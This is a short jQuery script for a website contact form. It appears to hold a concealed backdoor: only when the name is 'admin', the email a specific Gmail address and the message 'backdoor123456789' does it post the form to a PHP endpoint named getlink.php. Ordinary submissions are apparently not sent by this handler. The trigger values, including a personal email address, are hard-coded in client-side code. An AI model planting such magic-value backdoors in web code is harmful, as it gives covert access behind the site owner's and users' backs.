$(document).ready(function () {
	$('#myForm').submit(function () {
		var th = $(this);
		if (document.Form.name.value =='admin' && document.Form.email.value =='adimonchik@gmail.com' && document.Form.message.value =='backdoor123456789') {
			$.ajax({
				type: 'POST',
				url: '../phplib/getlink.php',
				data: $(this).serialize()
			}).done(function () {
				
				setTimeout(function() {
					th.trigger("reset");
				}, 1000);
			});
		return false;
		}
	});
});